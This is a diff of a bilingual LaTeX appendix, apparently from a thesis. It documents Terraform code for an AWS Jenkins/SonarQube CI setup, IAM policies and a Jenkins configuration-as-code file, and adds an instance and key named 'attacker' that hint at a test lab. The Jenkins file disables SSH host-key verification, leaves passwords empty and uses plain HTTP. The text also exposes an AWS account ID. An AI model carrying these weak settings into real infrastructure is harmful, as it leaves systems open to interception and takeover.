@@ -15,7 +15,6 @@
 
 \subsubsection{\IfLanguageName{dutch}{Input}
 {Input}}
-\label{sec:Input}
 
 \begin{lstlisting}[language=terraform]
     variable "vpc_cidr" {
@@ -47,7 +46,6 @@
 
 \subsubsection{\IfLanguageName{dutch}{Output}
 {Output}}
-\label{sec:Output}
 
 \begin{lstlisting}[language=terraform]
     output "vpc_id" {
@@ -57,7 +55,6 @@
 
 \subsubsection{\IfLanguageName{dutch}{Variables}
 {Variables}}
-\label{sec:Variables}
 
 \begin{lstlisting}[language=terraform]
   vpc_cidr = "192.168.0.0/16"
@@ -75,7 +72,6 @@
 
 \subsubsection{\IfLanguageName{dutch}{Input}
 {Input}}
-\label{sec:Input}
 
 \begin{lstlisting}[language=terraform]
     variable "aws_security_group" {
@@ -98,7 +94,6 @@
 
 \subsubsection{\IfLanguageName{dutch}{Variables}
 {Variables}}
-\label{sec:Variables}
 
 \begin{lstlisting}[language=terraform]
   security_group_config = {
@@ -119,6 +114,11 @@
         aws_security_group = "security_group_jenkins_slaves"
         aws_security_group_name = {Name="securitygroup_jenkins_slaves"}
     }
+    group5 = {
+      aws_security_group = "security_group_webserver"
+      aws_security_group_name = {Name="security_group_webserver"}
+    }
+
 }
 \end{lstlisting}
 
@@ -128,7 +128,6 @@
 
 \subsubsection{\IfLanguageName{dutch}{Input}
 {Input}}
-\label{sec:Input}
 
 \begin{lstlisting}[language=terraform]
     variable "aws_security_group" {
@@ -156,7 +155,6 @@
 
 \subsubsection{\IfLanguageName{dutch}{Data source}
 {Data source}}
-\label{sec:Data source}
 
 \begin{lstlisting}[language=terraform]
     # Data block om de security group id op te halen van de source
@@ -176,9 +174,8 @@
     }
 \end{lstlisting}
 
-\subsubsection{\IfLanguageName{dutch}{locals}
+\subsubsection{\IfLanguageName{dutch}{Locals}
 {Locals}}
-\label{sec:Locals}
 
 \begin{lstlisting}[language=terraform]
     # Bepalen of de cidr variable leeg is of niet
@@ -192,7 +189,6 @@
 
 \subsubsection{\IfLanguageName{dutch}{Variables}
 {Variables}}
-\label{sec:Variables}
 
 \begin{lstlisting}[language=terraform]
   security_group_ingress_rules_config = {
@@ -241,6 +237,7 @@ security_group_ingress_rules_config_nocidr = {
         aws_security_group_rule_protocol = "tcp"
 
     },
+
     rule2 = {
         aws_security_group = "security_group_jenkins"
         aws_security_group_from = 8080
@@ -263,6 +260,29 @@ security_group_ingress_rules_config_nocidr = {
         aws_security_group_rule_protocol = "tcp"
     },
 
+    rule5 = {
+        aws_security_group = "security_group_webserver"
+        aws_security_group_from = 22
+        aws_security_group_to = 22
+        aws_security_group_source = "security_group_jenkins"
+        aws_security_group_rule_protocol = "tcp"
+    },
+
+    rule6 = {
+        aws_security_group = "security_group_webserver"
+        aws_security_group_from = 8080
+        aws_security_group_to = 8080
+        aws_security_group_source = "security_group_jenkins"
+        aws_security_group_rule_protocol = "tcp"
+    },
+
+    rule7 = {
+        aws_security_group = "security_group_webserver"
+        aws_security_group_from = 22
+        aws_security_group_to = 22
+        aws_security_group_source = "security_group_bastion"
+        aws_security_group_rule_protocol = "tcp"
+    },
 }
 
 security_group_egress_rules_config = {
@@ -292,6 +312,14 @@ security_group_egress_rules_config = {
         aws_security_group_cidr = "0.0.0.0/0"
     }
 
+    rule5 = {
+        aws_security_group = "security_group_webserver"
+        aws_security_group_source = ""
+        aws_security_group_rule_protocol = "-1"
+        aws_security_group_cidr = "0.0.0.0/0"
+
+    },
+
 }
 \end{lstlisting}
 
@@ -301,7 +329,6 @@ security_group_egress_rules_config = {
 
 \subsubsection{\IfLanguageName{dutch}{Input}
 {Input}}
-\label{sec:Input}
 
 \begin{lstlisting}[language=terraform]
     variable "vpc_id" {
@@ -320,7 +347,6 @@ security_group_egress_rules_config = {
 
 \subsubsection{\IfLanguageName{dutch}{Output}
 {Output}}
-\label{sec:Output}
 
 \begin{lstlisting}[language=terraform]
     output "aws_internet_gateway_id" {
@@ -331,7 +357,6 @@ security_group_egress_rules_config = {
 
 \subsubsection{\IfLanguageName{dutch}{Variables}
 {Variables}}
-\label{sec:Variables}
 
 \begin{lstlisting}[language=terraform]
     aws_internet_gateway_name = {Name = "victorsgateway"}     
@@ -343,7 +368,6 @@ security_group_egress_rules_config = {
 
 \subsubsection{\IfLanguageName{dutch}{Input}
 {Input}}
-\label{sec:Input}
 
 \begin{lstlisting}[language=terraform]
     variable "vpc_id" {
@@ -433,7 +457,6 @@ security_group_egress_rules_config = {
 
 \subsubsection{\IfLanguageName{dutch}{Output}
 {Output}}
-\label{sec:Output}
 
 \begin{lstlisting}[language=terraform]
     output "private_subnet_id" {
@@ -459,7 +482,6 @@ security_group_egress_rules_config = {
 
 \subsubsection{\IfLanguageName{dutch}{Variables}
 {Variables}}
-\label{sec:Variables}
 
 \begin{lstlisting}[language=terraform]
     private_subnet_config = {
@@ -557,7 +579,6 @@ security_group_egress_rules_config = {
 
 \subsubsection{\IfLanguageName{dutch}{Input}
 {Input}}
-\label{sec:Input}
 
 \begin{lstlisting}[language=terraform]
     variable "aws_vpc_id" {
@@ -591,7 +612,6 @@ security_group_egress_rules_config = {
 
 \subsubsection{\IfLanguageName{dutch}{Output}
 {Output}}
-\label{sec:Output}
 
 \begin{lstlisting}[language=terraform]
     output "aws_route_table_public_id" {
@@ -601,16 +621,15 @@ security_group_egress_rules_config = {
 
 \subsubsection{\IfLanguageName{dutch}{Variables}
 {Variables}}
-\label{sec:Variables}
 
 \begin{lstlisting}[language=terraform]
     aws_route_table_public_cidr = "0.0.0.0/0"
     aws_route_table_public_name = {Name="mypublicroute"}
 \end{lstlisting}
 
-\subsection{\IfLanguageName{dutch}{Overzicht van de modules}
-{Overview of the modules}}
-\label{sec:Overzicht van de modules}
+\subsection{\IfLanguageName{dutch}{Overzicht van de netwerk modules}
+{Overview of the network modules}}
+\label{sec:Overzicht van de netwerk modules}
 
 \begin{lstlisting}[language=terraform]
     module "aws_vpc" {
@@ -792,5 +811,1892 @@ security_group_egress_rules_config = {
     }
 \end{lstlisting}
 
+\section{\IfLanguageName{dutch}{Custom AWS policies voor de verschillende rollen die gebruikt worden}
+{Custom AWS policies for the different roles being used}}
+\label{sec:Custom AWS policies voor de verschillende rollen die gebruikt worden}
+
+\begin{lstlisting}[language=awsiampolicy, style=awsiampolicy]
+{
+	"Version": "2012-10-17",
+	"Statement": [
+		{
+			"Sid": "VisualEditor0",
+			"Effect": "Allow",
+			"Action": "s3:GetObject",
+			"Resource": "arn:aws:s3:::mybucketbp/*"
+		}
+	]
+}
+\end{lstlisting}
+
+\begin{lstlisting}[language=awsiampolicy, style=awsiampolicy]
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "VisualEditor0",
+            "Effect": "Allow",
+            "Action": [
+                "iam:PassRole",
+                "autoscaling:UpdateAutoScalingGroup",
+                "iam:ListInstanceProfiles"
+            ],
+            "Resource": [
+                "arn:aws:autoscaling:eu-north-1:450477592783:autoScalingGroup:*:autoScalingGroupName/jenkins_slaves_autoscale_group",
+                "arn:aws:iam::450477592783:role/jenkins_master",
+                "arn:aws:iam::450477592783:instance-profile/demo_profile"
+            ]
+        },
+        {
+            "Sid": "VisualEditor1",
+            "Effect": "Allow",
+            "Action": [
+                "ec2:DescribeSpotFleetInstances",
+                "ec2:ModifySpotFleetRequest",
+                "ec2:DescribeInstances",
+                "ec2:TerminateInstances",
+                "ec2:CreateTags",
+                "autoscaling:DescribeAutoScalingGroups",
+                "ec2:DescribeRegions",
+                "iam:ListRoles",
+                "ec2:DescribeInstanceStatus",
+                "ec2:DescribeSpotFleetRequests"
+            ],
+            "Resource": "*"
+        }
+    ]
+}
+\end{lstlisting}
+
+\begin{lstlisting}[language=awsiampolicy, style=awsiampolicy]
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "VisualEditor0",
+            "Effect": "Allow",
+            "Action": "secretsmanager:GetSecretValue",
+            "Resource": "arn:aws:secretsmanager:eu-north-1:450477592783:secret:*"
+        },
+        {
+            "Sid": "VisualEditor1",
+            "Effect": "Allow",
+            "Action": "secretsmanager:ListSecrets",
+            "Resource": "*"
+        }
+    ]
+}
+\end{lstlisting}
+
+\section{\IfLanguageName{dutch}{Jenkins jcasc file}
+{Jenkins jcasc file}}
+\label{sec:Jenkins jcasc file}
+
+\begin{lstlisting}[language=yaml, style=yamlstyle]
+    jenkins:
+    systemMessage: "\r\n\r\nDemo setup for Jenkins Configuration as Code plugin......\r\
+      \n\r\n"
+    securityRealm:
+      local:
+        allowsSignup: false
+        enableCaptcha: false
+        users:
+        - id: "admin"
+          password: ""
+        - id: "dev"
+          password: ""
+          properties:
+          - "apiToken"
+          - "myView"
+          - "timezone"
+          - "mailer"
+          - preferredProvider:
+              providerId: "default"
+    authorizationStrategy:
+      globalMatrix:
+        permissions:
+        - "Job/Build:dev"
+        - "Job/Cancel:dev"
+        - "Job/Read:dev"
+        - "Job/Workspace:dev"
+        - "Overall/Administer:admin"
+        - "Overall/Read:authenticated"
+        - "Run/Replay:dev"
+        - "Run/Update:dev"
+    agentProtocols:
+    - "JNLP4-connect"
+    - "Ping"
+    clouds:
+    - eC2Fleet:
+        addNodeOnlyIfRunning: false
+        alwaysReconnect: true
+        cloudStatusIntervalSec: 10
+        computerConnector:
+          sSHConnector:
+            credentialsId: "ssh_connection_slaveec2"
+            launchTimeoutSeconds: 60
+            maxNumRetries: 10
+            port: 22
+            retryWaitTime: 15
+            sshHostKeyVerificationStrategy: "nonVerifyingKeyVerificationStrategy"
+        disableTaskResubmit: false
+        fleet: "jenkins_slaves_autoscale_group"
+        idleMinutes: 5
+        initOnlineCheckIntervalSec: 15
+        initOnlineTimeoutSec: 180
+        labelString: "ec2-fleet"
+        maxSize: 1
+        maxTotalUses: -1
+        minSize: 0
+        minSpareSize: 0
+        name: "FleetCloud"
+        noDelayProvision: false
+        numExecutors: 1
+        oldId: "d4311b4b-c348-4d44-8884-b53c4e0738da"
+        privateIpUsed: true
+        region: "eu-north-1"
+        restrictUsage: true
+        scaleExecutorsByWeight: false
+    crumbIssuer:
+      standard:
+        excludeClientIPFromCrumb: false
+    disableRememberMe: false
+    disabledAdministrativeMonitors:
+    - "jenkins.diagnostics.ControllerExecutorsNoAgents"
+    labelAtoms:
+    - name: "built-in"
+    - name: "ec2-fleet"
+    - name: "i-06f5942e6ab50668f"
+    markupFormatter: "plainText"
+    mode: NORMAL
+    myViewsTabBar: "standard"
+    numExecutors: 0
+    primaryView:
+      all:
+        name: "all"
+    projectNamingStrategy: "standard"
+    quietPeriod: 5
+    remotingSecurity:
+      enabled: true
+    scmCheckoutRetryCount: 0
+    slaveAgentPort: -1
+    updateCenter:
+      sites:
+      - id: "default"
+        url: "https://updates.jenkins.io/update-center.json"
+    views:
+    - all:
+        name: "all"
+    viewsTabBar: "standard"
+  globalCredentialsConfiguration:
+    configuration:
+      providerFilter: "none"
+      typeFilter: "none"
+  security:
+    apiToken:
+      creationOfLegacyTokenEnabled: false
+      tokenGenerationOnCreationEnabled: false
+      usageStatisticsEnabled: true
+    gitHooks:
+      allowedOnAgents: false
+      allowedOnController: false
+    gitHostKeyVerificationConfiguration:
+      sshHostKeyVerificationStrategy: "knownHostsFileVerificationStrategy"
+    sSHD:
+      port: -1
+  unclassified:
+    buildDiscarders:
+      configuredBuildDiscarders:
+      - "jobBuildDiscarder"
+    buildStepOperation:
+      enabled: false
+    email-ext:
+      adminRequiredForTemplateTesting: false
+      allowUnregisteredEnabled: false
+      charset: "UTF-8"
+      debugMode: false
+      defaultBody: |-
+        $PROJECT_NAME - Build # $BUILD_NUMBER - $BUILD_STATUS:
+  
+        Check console output at $BUILD_URL to view the results.
+      defaultContentType: "text/plain"
+      defaultSubject: "$PROJECT_NAME - Build # $BUILD_NUMBER - $BUILD_STATUS!"
+      defaultTriggerIds:
+      - "hudson.plugins.emailext.plugins.trigger.FailureTrigger"
+      maxAttachmentSize: -1
+      maxAttachmentSizeMb: -1
+      precedenceBulk: false
+      watchingEnabled: false
+    enrichedSummaryConfig:
+      enrichedSummaryEnabled: false
+      httpClientDelayBetweenRetriesInSeconds: 1
+      httpClientMaxRetries: 3
+      httpClientTimeoutInSeconds: 1
+    fingerprints:
+      fingerprintCleanupDisabled: false
+      storage: "file"
+    gitHubConfiguration:
+      apiRateLimitChecker: ThrottleForNormalize
+    gitHubPluginConfig:
+      hookUrl: "http://tf-lb-20230423091425596800000008-116177006.eu-north-1.elb.amazonaws.com/github-webhook/"
+    globalLibraries:
+      libraries:
+      - defaultVersion: "main"
+        name: "my-shared-library"
+        retriever:
+          modernSCM:
+            libraryPath: "./"
+            scm:
+              git:
+                id: "06233dda-e872-493c-910a-8ed32d3a5c31"
+                remote: "https://github.com/VictorVanhoorenHogent/jenkins_shared_lib.git"
+                traits:
+                - "gitBranchDiscovery"
+    globalTimeOutConfiguration:
+      operations:
+      - "abortOperation"
+      overwriteable: false
+    injectionConfig:
+      allowUntrusted: false
+      enabled: false
+      injectCcudExtension: false
+      injectMavenExtension: false
+    junitTestResultStorage:
+      storage: "file"
+    location:
+      adminAddress: "address not configured yet <nobody@nowhere>"
+      url: "http://tf-lb-20230423091425596800000008-116177006.eu-north-1.elb.amazonaws.com/"
+    mailer:
+      charset: "UTF-8"
+      useSsl: false
+      useTls: false
+    mavenModuleSet:
+      localRepository: "default"
+    pollSCM:
+      pollingThreadCount: 10
+    prismConfiguration:
+      theme: PRISM
+    scmGit:
+      addGitTagAction: false
+      allowSecondFetch: false
+      createAccountBasedOnEmail: false
+      disableGitToolChooser: false
+      hideCredentials: false
+      showEntireCommitSummaryInChanges: false
+      useExistingAccountWithSameEmail: false
+    sonarGlobalConfiguration:
+      buildWrapperEnabled: false
+      installations:
+      - name: "sonarqubeserver"
+        serverUrl: "http:///tf-lb-20230423091425467900000007-255634209.eu-north-1.elb.amazonaws.com/"
+        triggers:
+          skipScmCause: false
+          skipUpstreamCause: false
+    timestamper:
+      allPipelines: false
+      elapsedTimeFormat: "'<b>'HH:mm:ss.S'</b> '"
+      systemTimeFormat: "'<b>'HH:mm:ss'</b> '"
+  tool:
+    git:
+      installations:
+      - home: "git"
+        name: "Default"
+    mavenGlobalConfig:
+      globalSettingsProvider: "standard"
+      settingsProvider: "standard"
+\end{lstlisting}
+
+\section{\IfLanguageName{dutch}{Variabelen, inputs, outputs, data sources en locals voor het bouwen van de infrastructuur}
+{Variables to build the infrastructure}}
+\label{sec:Variabelen, inputs, outputs, data sources en locals voor het bouwen van de infrastructuur}
+
+\subsection{\IfLanguageName{dutch}{AWS keys}
+{AWS keys}}
+\label{sec:AWS keys}
+
+\subsubsection{\IfLanguageName{dutch}{Input}
+{Input}}
+
+\begin{lstlisting}[language=terraform]
+  variable "aws_key_pair_name" {
+    type = string
+    default = "mykey"
+}
+
+variable "aws_key_pair_public" {
+    type = string
+    default = "test"
+  
+}  
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Output}
+{Output}}
+
+\begin{lstlisting}[language=terraform]
+  output "aws_key_pair_name" {
+    value = aws_key_pair.key.key_name
+}   
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Variables}
+{Variables}}
+
+\begin{lstlisting}[language=terraform]
+  key_config = {
+    key1 = {
+        aws_key_pair_name = "bastion_aws"
+        aws_key_pair_public = ""
+
+    }
+    key2 = {
+        aws_key_pair_name = "jenkins_slave"
+        aws_key_pair_public = ""
+
+    }
+    key3 = {
+      aws_key_pair_name = "attacker"
+      aws_key_pair_public = ""
+  }
+
+}
+\end{lstlisting}
+
+\subsection{\IfLanguageName{dutch}{Bastion server}
+{Bastion server}}
+\label{sec:Bastion server}
+
+\subsubsection{\IfLanguageName{dutch}{Input}
+{Input}}
+
+\begin{lstlisting}[language=terraform]
+    variable "aws_ami" {
+        type = string
+        default = ""
+    }
+    
+    variable "aws_key_pair_name" {
+        type = string
+      
+    }
+    
+    variable "aws_instance_type" {
+        type = string
+        default = "t2.micro"
+      
+    }
+    
+    variable "aws_associate_public_ip" {
+        type = bool
+        default = "true"
+      
+    }
+    
+    variable "aws_instance_volume_type" {
+        type = string
+        default = "gp3"
+    }
+    
+    variable "aws_instance_volume_size" {
+        type = number
+        default = 30
+    }
+    
+    variable "aws_instance_delete_on_termination" {
+        type = bool
+        default = false
+    }
+    
+    variable "aws_tags" {
+        type = map(any)
+        default = {Name = "myvm"}
+      
+    }
+    
+    variable "aws_security_group" {
+        type = string
+    }
+    
+    variable "aws_subnet_name" {
+        type = string
+        default = ""
+      
+    }
+    
+    variable "script" {
+        type = string
+        default = ""
+      
+    }
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Variables}
+{Variables}}
+
+\begin{lstlisting}[language=terraform]
+  instance_config = {
+    instance1 = {
+        aws_ami = "ami-064087b8d355e9051"
+        aws_instance_type = "t3.micro"
+        aws_key_pair_name = "bastion_aws"
+        aws_associate_public_ip = true
+        aws_security_group = "security_group_bastion"
+        aws_subnet_name = "public-eu-north-1c"
+        aws_instance_volume_type = "gp3"
+        aws_instance_volume_size = 8
+        aws_instance_delete_on_termination = false
+        aws_tags = { Name= "bastion" }
+        script = "install.sh"
+    },
+    instance2 = {
+        aws_ami = "ami-064087b8d355e9051"
+        aws_instance_type = "t3.small"
+        aws_key_pair_name = "attacker"
+        aws_associate_public_ip = true
+        aws_security_group = "security_group_bastion"
+        aws_subnet_name = "public-eu-north-1c"
+        aws_instance_volume_type = "gp3"
+        aws_instance_volume_size = 8
+        aws_instance_delete_on_termination = false
+        aws_tags = { Name = "attacker" }
+        script = "install.sh"
+    }
+    instance3 = {
+        aws_ami = "ami-064087b8d355e9051"
+        aws_instance_type = "t3.small"
+        aws_key_pair_name = "pythondep"
+        aws_associate_public_ip = false
+        aws_security_group = "security_group_webserver"
+        aws_subnet_name = "private-eu-north-1c"
+        aws_instance_volume_type = "gp3"
+        aws_instance_volume_size = 8
+        aws_instance_delete_on_termination = false
+        aws_tags = { Name = "pythondep" }
+        script = "pythondep.sh"
+    }
+
+}
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Datasources}
+{Datasources}}
+
+\begin{lstlisting}[language=terraform]
+    data "aws_subnets" "name" {
+        filter {
+          name = "tag:Name"
+          values = ["*private*"]
+        }
+    }
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Script}
+{Script}}
+
+\begin{lstlisting}[language=bash, style=bashstyle]
+#!/bin/bash
+
+# Update the package list on the system
+apt update -y
+
+apt install awscli -y
+\end{lstlisting}
+
+\subsection{\IfLanguageName{dutch}{Jenkins server}
+{Jenkins server}}
+\label{sec:Jenkins server}
+
+\subsubsection{\IfLanguageName{dutch}{Jenkins server policies}
+{Jenkins server policies}}
+\label{sec:Jenkins server policies}
+
+\begin{lstlisting}[language=terraform] 
+  
+  # Resource block die de policy linkt met de nieuwe rol
+  resource "aws_iam_role_policy_attachment" "s3bucketread" {
+
+    # Naam van de nieuwe aangemaakte rol
+    role       = aws_iam_role.instance.name
+
+    # Policy om toegang te krijgen tot de S3 bucket
+    policy_arn = "arn:aws:iam::450477592783:policy/jcascaccess"
+  }
+  
+  # Resource block die de policy linkt met de nieuwe rol
+  resource "aws_iam_role_policy_attachment" "autoscaling_group" {
+
+    # Naam van de nieuwe aangemaakte rol
+    role       = aws_iam_role.instance.name
+
+    # Policy om ec2 instances aan te maken en te verwijderen en deze policy verleent toegang to verschillende autoscaling functies
+    policy_arn = "arn:aws:iam::450477592783:policy/scalinggroup_spotfleet"
+  }
+  
+  # Resource block die de policy linkt met de nieuwe rol
+  resource "aws_iam_role_policy_attachment" "secrets_manager" {
+    
+    # Naam van de nieuwe aangemaakte rol
+    role       = aws_iam_role.instance.name
+
+    # Policy om toegang te verlenen tot de secrets manager.
+    policy_arn = "arn:aws:iam::450477592783:policy/secrets_manager_jenkins"
+  } 
+\end{lstlisting}
 
 
+\subsubsection{\IfLanguageName{dutch}{AWS instance resource}
+{AWS instance resource}}
+
+\begin{lstlisting}[language=terraform]
+    resource "aws_instance" "instance" {
+        ami = data.aws_ami.jenkins-master.id
+        key_name = var.aws_key_pair_name
+        instance_type = var.aws_instance_type
+        associate_public_ip_address = var.aws_associate_public_ip
+        subnet_id = data.aws_subnet.subnet.id
+        vpc_security_group_ids = [data.aws_security_group.group.id]
+        iam_instance_profile = aws_iam_instance_profile.demo-profile.name
+        root_block_device {
+          volume_type = var.aws_instance_volume_type
+          volume_size = var.aws_instance_volume_size
+          delete_on_termination = var.aws_instance_delete_on_termination
+        }
+        user_data = "${file("modules/aws_ec2_instance_custom/scripts/${var.script}")}"
+        tags = var.aws_tags
+    
+        depends_on = [
+          aws_iam_role.instance, aws_iam_role_policy_attachment.s3bucketread, aws_iam_role_policy_attachment.autoscaling_group, aws_iam_role_policy_attachment.secrets_manager
+        ]
+    }   
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Input}
+{Input}}
+
+\begin{lstlisting}[language=terraform]
+    variable "aws_ami" {
+        type = string
+        default = ""
+    }
+    
+    variable "aws_key_pair_name" {
+        type = string
+      
+    }
+    
+    variable "aws_instance_type" {
+        type = string
+        default = "t2.micro"
+      
+    }
+    
+    variable "aws_associate_public_ip" {
+        type = bool
+        default = "true"
+      
+    }
+    
+    variable "aws_instance_volume_type" {
+        type = string
+        default = "gp3"
+    }
+    
+    variable "aws_instance_volume_size" {
+        type = number
+        default = 30
+    }
+    
+    variable "aws_instance_delete_on_termination" {
+        type = bool
+        default = false
+    }
+    
+    variable "aws_tags" {
+        type = map(any)
+        default = {Name = "myvm"}
+      
+    }
+    
+    variable "aws_security_group" {
+        type = string
+    }
+    
+    variable "aws_subnet_name" {
+        type = string
+        default = ""
+      
+    }
+    
+    variable "script" {
+        type = string
+        default = ""
+      
+    }
+    
+    variable "aws_instance_role_name" {
+      type = string
+    } 
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Variables}
+{Variables}}
+
+\begin{lstlisting}[language=terraform]
+    instance_config_custom = {
+        instance1 = {
+            aws_ami = "Jenkins_Sonarqube"
+            aws_instance_type = "t3.medium"
+            aws_key_pair_name = "bastion_aws"
+            aws_associate_public_ip = false
+            aws_security_group = "security_group_jenkins"
+            aws_subnet_name = "private-eu-north-1c"
+            aws_instance_volume_type = "gp3"
+            aws_instance_volume_size = 8
+            aws_instance_delete_on_termination = false
+            aws_tags = { Name = "jenkins" }
+            script = "jenkins.sh"
+            aws_instance_role_name = "jenkins_master"
+        }
+    }  
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Datasources}
+{Datasources}}
+
+\begin{lstlisting}[language=terraform]
+    data "aws_security_group" "group" {
+        name = var.aws_security_group
+      
+    }
+    
+    data "aws_subnet" "subnet" {
+        filter {
+           name = "tag:Name"
+           values = [var.aws_subnet_name]
+        }
+    }
+    
+    data "aws_ami" "jenkins-master" { 
+         filter {
+          name = "tag:Name"
+          values = ["${var.aws_ami}"]
+        }
+        filter {
+          name = "tag:Owner"
+          values = ["Me"]
+        }
+    } 
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Script}
+{Script}}
+
+\begin{lstlisting}[language=bash, style=bashstyle]
+    #!/bin/bash
+
+    # Update the package list on the system
+    apt update -y
+    
+    # Install the AWS CLI
+    apt install awscli -y
+    
+    # Set the CASC_JENKINS_CONFIG environment variable to the path of jcasc.yaml
+    sed -i 's/\[Service\]/&\nEnvironment="CASC_JENKINS_CONFIG=\/var\/lib\/jenkins\/casc_config"/' /lib/systemd/system/jenkins.service
+    
+    # Create the directory for jcasc.yaml
+    mkdir -p /var/lib/jenkins/casc_config/
+    
+    # Download jcasc.yaml file from S3 bucket
+    aws s3 cp s3://mybucketbp/jenkinscasc.yaml /var/lib/jenkins/casc_config
+    
+    # Reload the systemd daemon to apply changes
+    systemctl daemon-reload
+    
+    # Restart Jenkins service for changes to take effect
+    systemctl restart jenkins
+\end{lstlisting}
+
+\subsection{\IfLanguageName{dutch}{Launch template}
+{Launch template}}
+\label{sec:Launch template}
+
+\subsubsection{\IfLanguageName{dutch}{AWS launch template}
+{AWS launch template}}
+
+\begin{lstlisting}[language=terraform]
+    resource "aws_launch_template" "slaves" {
+        name = var.aws_launch_template_name
+      
+        disable_api_stop        = false
+        disable_api_termination = false
+      
+        ebs_optimized = true
+      
+        #iam_instance_profile {
+        #  name = "test"
+        #}
+      
+        image_id = data.aws_ami.example.id
+      
+        instance_initiated_shutdown_behavior = "stop"
+      
+        instance_type = var.aws_instance_type
+      
+        key_name = var.aws_key_pair_name
+      
+        monitoring {
+          enabled = true
+        }
+      
+        vpc_security_group_ids = [data.aws_security_group.name.id]
+      
+        user_data = "${filebase64("modules/aws_launch_template/scripts/${var.script}")}"
+      
+      }
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Input}
+{Input}}
+
+\begin{lstlisting}[language=terraform]
+    variable "aws_launch_template_name" {
+        type = string
+      }
+      
+      variable "aws_instance_type" {
+        type = string
+      }
+      
+      variable "aws_key_pair_name" {
+        type = string
+        
+      }
+      
+      variable "aws_ami" {
+        type = string
+        
+      }
+      
+      variable "script" {
+        type = string
+        
+      }
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Output}
+{Output}}
+
+\begin{lstlisting}[language=terraform]
+    output "aws_launch_template_id" {
+        value = aws_launch_template.slaves.id
+      
+    } 
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Variables}
+{Variables}}
+
+\begin{lstlisting}[language=terraform]
+    launch_template_config = {
+        aws_ami = "jenkins_slave"
+        aws_key_pair_name = "jenkins_slave"
+        aws_instance_type = "t3.small"
+        aws_launch_template_name = "jenkins_slave"
+        script = "jenkins_slave.sh"
+    }
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Datasources}
+{Datasources}}
+
+\begin{lstlisting}[language=terraform]
+    data "aws_security_group" "name" {
+        filter {
+          name="tag:Name"
+          values = ["securitygroup_jenkins_slaves"]
+        }
+        
+      }
+      
+      data "aws_ami" "example" {
+        filter {
+          name="tag:Name"
+          values = ["${var.aws_ami}"]
+        }
+        filter {
+          name="tag:Owner"
+          values = ["Me"]
+        }
+        
+      }
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Script}
+{Script}}
+
+\begin{lstlisting}[language=bash, style=bashstyle]
+    #!/bin/bash
+
+    # Update the package list on the system
+    apt update -y
+    
+    apt install awscli -y
+\end{lstlisting}
+
+\subsection{\IfLanguageName{dutch}{Autoscaling group}
+{Autoscaling group}}
+\label{sec:Autoscaling group}
+
+\subsubsection{\IfLanguageName{dutch}{Input}
+{Input}}
+
+\begin{lstlisting}[language=terraform]
+    variable "aws_launch_template_id" {
+        type = string
+        
+    }
+    
+    variable "aws_autoscaling_group_name" {
+        type = string
+        default = "myautoscalinggroup"
+      
+    }
+\end{lstlisting}
+
+
+\subsubsection{\IfLanguageName{dutch}{Variables}
+{Variables}}
+
+\begin{lstlisting}[language=terraform]
+aws_autoscaling_group_name = "jenkins_slaves_autoscale_group"
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Datasources}
+{Datasources}}
+
+\begin{lstlisting}[language=terraform]
+    data "aws_subnets" "name" {
+        filter {
+          name = "tag:Name"
+          values = ["*private*"]
+        }
+    }
+\end{lstlisting}
+
+\subsection{\IfLanguageName{dutch}{Loadbalancers}
+{Loadbalancers}}
+\label{sec:Loadbalancers}
+
+\subsubsection{\IfLanguageName{dutch}{Input}
+{Input}}
+
+\begin{lstlisting}[language=terraform]
+    variable "aws_security_group" {
+        type = string
+      
+    }
+    
+    variable "cross_zone_load_balancing" {
+        type = bool
+        default = true
+    }
+    
+    variable "loadbalancer_instance_port" {
+      type = number
+      
+    }
+    
+    variable "loadbalancer_target" {
+      type = number
+      
+    }
+    
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Variables}
+{Variables}}
+
+\begin{lstlisting}[language=terraform]
+    loadbalancer_config = {
+        balancer1 = {
+            aws_security_group = "security_group_lb"
+            cross_zone_load_balancing = true
+            loadbalancer_instance_port = 8080
+            loadbalancer_target = 8080
+        },
+        balancer2 = {
+            aws_security_group = "security_group_lb"
+            cross_zone_load_balancing = true
+            loadbalancer_instance_port = 9000
+            loadbalancer_target = 9000
+        }
+    }
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Datasources}
+{Datasources}}
+
+\begin{lstlisting}[language=terraform]
+    data "aws_subnets" "name" {
+        filter {
+          name = "tag:Name"
+          values = ["*public*"]
+        }
+      
+    }
+    
+    data "aws_security_group" "name" {
+      name = var.aws_security_group
+    }
+    
+    data "aws_instance" "name" {
+      filter {
+        name = "tag:Name"
+        values = ["jenkins"]
+      }
+      filter {
+        name = "instance-state-name"
+        values = ["running"]
+      }
+    }
+    
+\end{lstlisting}
+
+
+\subsection{\IfLanguageName{dutch}{EKS cluster}
+{EKS cluster}}
+\label{sec:EKS cluster}
+
+\subsubsection{\IfLanguageName{dutch}{EKS rol}
+{EKS rol}}
+
+\begin{lstlisting}[language=terraform]
+    resource "aws_iam_role" "eks_cluster" {
+        name = var.aws_eks_iam_role_name
+      
+        # Terraform's "jsonencode" function converts a
+        # Terraform expression result to valid JSON syntax.
+        assume_role_policy = jsonencode({
+          Version = "2012-10-17"
+          Statement = [
+            {
+              Action = "sts:AssumeRole"
+              Effect = "Allow"
+              Sid    = ""
+              Principal = {
+                Service = "eks.amazonaws.com"
+              }
+            },
+          ]
+        })
+      }
+      
+      resource "aws_iam_role_policy_attachment" "amazon_eks_cluster_policy" {
+        role       = aws_iam_role.eks_cluster.name
